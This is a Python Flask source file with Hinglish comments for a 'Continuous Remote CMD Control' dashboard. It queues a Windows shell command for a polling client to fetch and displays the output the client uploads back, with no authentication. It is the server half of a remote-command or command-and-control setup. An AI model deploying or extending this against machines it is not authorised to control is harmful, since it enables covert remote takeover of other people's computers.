from flask import Flask, request

app = Flask(__name__)

# डिफ़ॉल्ट कमांड
current_command = "dir"
latest_output = "Client ka intezaar hai... Command bhejiye."

@app.route('/')
def index():
    global latest_output, current_command
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Continuous Remote CMD Control</title>
        <style>
            body {{ font-family: monospace; background-color: #0d1117; color: #58a6ff; padding: 20px; }}
            h2 {{ color: #c9d1d9; }}
            .container {{ background-color: #161b22; padding: 20px; border-radius: 6px; border: 1px solid #30363d; margin-bottom: 20px; }}
            pre {{ white-space: pre-wrap; word-wrap: break-word; font-size: 15px; color: #7ee787; }}
            input[type="text"] {{ width: 70%; padding: 10px; background: #0d1117; border: 1px solid #30363d; color: #fff; font-size: 16px; border-radius: 4px; }}
            input[type="submit"] {{ padding: 10px 20px; background: #238636; border: none; color: white; font-size: 16px; border-radius: 4px; cursor: pointer; }}
            input[type="submit"]:hover {{ background: #2ea043; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Command Input Box (Live Loop)</h2>
            <form action="/set-command" method="POST">
                <input type="text" name="cmd" value="{current_command}" placeholder="Yahan command likhein (Jaise: ipconfig, dir, notepad)">
                <input type="submit" value="Update Command">
            </form>
        </div>

        <div class="container">
            <h2>Live Output Screen</h2>
            <hr>
            <pre>{latest_output}</pre>
        </div>
    </body>
    </html>
    """

@app.route('/set-command', methods=['POST'])
def set_command():
    global current_command
    current_command = request.form.get('cmd', 'dir')
    return """
    <script>
        window.location.href = "/";
    </script>
    """

@app.route('/get-command', methods=['GET'])
def get_command():
    # यहाँ सर्वर प्रिंट नहीं करेगा ताकि टर्मिनल गंदा न हो, बस कमांड भेज देगा
    return current_command

@app.route('/upload-result', methods=['POST'])
def upload_result():
    global latest_output
    raw_data = request.data.decode('utf-8', errors='ignore')

    if len(raw_data.strip()) > 0:
        latest_output = raw_data
    else:
        latest_output = "Command execute ho gayi (No text output)."

    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
